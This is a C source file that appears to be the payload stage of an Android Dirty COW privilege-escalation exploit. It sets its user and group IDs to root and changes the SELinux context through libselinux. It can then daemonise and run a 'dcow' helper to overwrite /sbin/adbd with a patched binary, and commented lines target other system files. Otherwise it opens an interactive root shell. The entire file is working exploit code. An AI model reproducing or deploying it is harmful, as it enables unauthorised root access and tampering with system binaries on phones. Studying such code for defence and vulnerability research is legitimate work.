#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <dlfcn.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <time.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

//reduce binary size
char __aeabi_unwind_cpp_pr0[0];

typedef int getcon_t(char ** con);
typedef int setcon_t(const char* con);

extern int dcow(int argc, const char *argv[]);

static int append = 0;

void dup_standard(const char *file)
{
    close(STDIN_FILENO);
    int out = open(file,
            O_CREAT | O_WRONLY | (append ? O_APPEND : O_TRUNC));

    if (out < 0)
    {
        fprintf(stderr, "Warning: Error redirecting stdout/stderr to --log file: %s %s\n", file, strerror(errno));
        return;
    }

    if (dup2(out, STDOUT_FILENO) == -1)
    {
        fprintf(stderr, "--log file redirection error on stdout\n");
    }
    if (dup2(out, STDERR_FILENO) == -1)
    {
        fprintf(stderr, "--log file redirection error on stderr\n");
    }

    if (out > 2)
    {
        close(out);
    }

}


void create_log(void)
{
    char buf[1024];

    char dt[20]; // space enough for DD/MM/YYYY HH:MM:SS and terminator
    struct tm tm;
    time_t current_time;

    current_time = time(NULL);
    tm = *localtime(&current_time); // convert time_t to struct tm
    strftime(dt, sizeof dt, "%Y-%m-%d_%H%M%S", &tm); // format

    sprintf(buf, "/storage/emulated/legacy/zpilogs/run-as_%s.log", dt);
    dup_standard(buf);
}

void daemonise(const char *dcow, const char *src, const char *dst) {
    // Fork, allowing the parent process to terminate.
    pid_t pid = fork();
    if (pid == -1) {
        fprintf(stderr, "failed to fork while daemonising (errno=%d)\n",errno);
    } else if (pid != 0) {
        printf("quitting first parent, child is %d\n", pid);
        exit(0);
    }

    // Start a new session for the daemon.
    if (setsid()==-1) {
        fprintf(stderr, "failed to become a session leader while daemonising(errno=%d)\n",errno);
    }

    // Fork again, allowing the parent process to terminate.
    signal(SIGHUP,SIG_IGN);
    pid=fork();
    if (pid == -1) {
        fprintf(stderr, "failed to fork while daemonising (errno=%d)\n",errno);
    } else if (pid != 0) {
        exit(0);
    }

    // Set the current working directory to the root directory.
    if (chdir("/") == -1) {
        fprintf(stderr, "failed to change working directory while daemonising (errno=%d)\n",errno);
    }

    // Set the user file creation mask to zero.
    umask(0);

    // Close then reopen standard file descriptors.
    create_log();
    sleep(10);
    printf("writing %s to %s\n", src, dst);
    char cmd[200];
    sprintf(cmd, "%s %s %s", dcow, src, dst);
    system(cmd);
    printf("done writing\n");
}

int main(int argc, const char **argv)
{
	LOGV("uid %s %d", argv[0], getuid());

	if (setresgid(0, 0, 0) || setresuid(0, 0, 0)) {
		LOGV("setresgid/setresuid failed");
	}

	LOGV("uid %d", getuid());

#ifdef __aarch64__
	void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
	void * selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
	if (selinux) {
		void * getcon = dlsym(selinux, "getcon");
		if (getcon == NULL) {
			const char *error = dlerror();
			LOGV("dlsym error %s", error);
		} else {
			getcon_t * getcon_p = (getcon_t*)getcon;
			char * secontext;
			int ret = (*getcon_p)(&secontext);
			LOGV("%d %s", ret, secontext);
			void * setcon = dlsym(selinux, "setcon");
			if (setcon == NULL) {
				const char *error = dlerror();
				LOGV("dlsym setcon error %s", error);
			} else {
				setcon_t * setcon_p = (setcon_t*)setcon;
				ret = (*setcon_p)("u:r:shell:s0");
				ret = (*getcon_p)(&secontext);
				LOGV("context %d %s", ret, secontext);
			}
		}
		dlclose(selinux);
	} else {
		LOGV("no selinux?");
	}

	if (argc==2 && strcmp(argv[1], "--background") == 0) {
		daemonise("/data/local/tmp/dcow", "/data/local/tmp/adbd.patched", "/sbin/adbd");
		//daemonise("/data/local/tmp/dcow", "/data/local/tmp/cm/libbusybox.so", "/system/lib/libpdfium.so");
		//daemonise("/data/local/tmp/dcow", "/data/local/tmp/bbdlopen", "/system/bin/reboot");
	}
	else
		system("/system/bin/sh -i");

}
